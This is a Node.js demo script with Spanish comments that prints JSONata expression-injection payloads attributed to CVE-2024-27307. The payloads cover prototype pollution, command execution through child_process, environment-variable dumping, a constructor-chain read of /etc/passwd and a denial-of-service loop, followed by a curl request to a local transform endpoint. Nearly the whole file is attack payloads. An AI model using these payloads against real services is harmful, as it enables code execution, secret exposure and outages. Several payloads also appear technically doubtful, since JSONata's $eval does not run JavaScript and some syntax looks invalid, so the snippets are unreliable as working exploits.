// Demostración de ataques de inyección de expresiones JSONata
// Basado en CVE-2024-27307 y técnicas de explotación actuales

console.log("=== DEMOSTRACIÓN DE VULNERABILIDADES JSONata ===\n")

// 1. ATAQUE DE PROTOTYPE POLLUTION
console.log("1. PROTOTYPE POLLUTION:")
console.log("Expresión maliciosa que contamina Object.prototype:")
const prototypePollutionExpression = `
(
  $set := function($obj, $key, $val) {(
    $obj ~> | $ | {$key: $val} |
  )};
  $constructor := $type($);
  $proto := $eval($constructor).prototype;
  $set($proto, "isAdmin", true);
  "Prototype pollution exitoso"
)
`
console.log(prototypePollutionExpression)
console.log("\nEsta expresión:")
console.log("- Accede al constructor del objeto")
console.log("- Obtiene el prototype")
console.log("- Inyecta propiedades maliciosas (isAdmin: true)")
console.log("- Afecta a TODOS los objetos JavaScript\n")

// 2. EJECUCIÓN DE CÓDIGO ARBITRARIO
console.log("2. EJECUCIÓN DE CÓDIGO ARBITRARIO:")
console.log("Expresión que ejecuta comandos del sistema:")
const codeExecutionExpression = `
(
  $spawn := $eval("require('child_process').spawn");
  $proc := $spawn("whoami", []);
  $proc.stdout.on("data", function($data) {
    $append("/tmp/pwned.txt", $string($data))
  });
  "Comando ejecutado"
)
`
console.log(codeExecutionExpression)
console.log("\nEsta expresión:")
console.log("- Usa $eval para acceder a require")
console.log("- Importa child_process")
console.log("- Ejecuta comandos del sistema")
console.log("- Puede leer/escribir archivos\n")

// 3. ACCESO A VARIABLES GLOBALES
console.log("3. ACCESO A VARIABLES GLOBALES Y PROCESO:")
const globalAccessExpression = `
(
  $global := $eval("global");
  $process := $eval("process");
  {
    "nodeVersion": $process.version,
    "platform": $process.platform,
    "env": $keys($process.env),
    "cwd": $process.cwd()
  }
)
`
console.log(globalAccessExpression)
console.log("\nEsta expresión expone información sensible del sistema\n")

// 4. BYPASS DE SANDBOX - TÉCNICA AVANZADA
console.log("4. BYPASS DE SANDBOX USANDO CONSTRUCTOR CHAIN:")
const sandboxBypassExpression = `
(
  $Function := {}.constructor.constructor;
  $evil := $Function("return process.mainModule.require('fs').readFileSync('/etc/passwd', 'utf8')");
  $evil()
)
`
console.log(sandboxBypassExpression)
console.log("\nEsta expresión:")
console.log("- Usa constructor chain para obtener Function")
console.log("- Crea funciones arbitrarias")
console.log("- Bypasea restricciones de sandbox\n")

// 5. DOS (Denial of Service)
console.log("5. ATAQUE DE DENEGACIÓN DE SERVICIO:")
const dosExpression = `
(
  $range(1, 1000000) ~> $map(function($i) {
    $range(1, 1000) ~> $reduce(function($acc, $val) {
      $acc & $string($random() * $val)
    }, "")
  })
)
`
console.log(dosExpression)
console.log("\nEsta expresión consume recursos excesivos causando DoS\n")

// Ejemplo de cómo enviar estos ataques
console.log("=== EJEMPLO DE USO CON CURL ===")
console.log(`
curl -X POST http://localhost:3000/transform \\
  -H "Content-Type: application/json" \\
  -d '{
    "expression": "($eval(\\"process.env\\"))",
    "input": {}
  }'
`)

console.log("\n=== IMPACTO DE LAS VULNERABILIDADES ===")
console.log("1. Lectura de archivos sensibles del sistema")
console.log("2. Ejecución de comandos arbitrarios")
console.log("3. Modificación del comportamiento de la aplicación")
console.log("4. Exposición de variables de entorno y secretos")
console.log("5. Denegación de servicio")
console.log("6. Escape del sandbox de evaluación\n")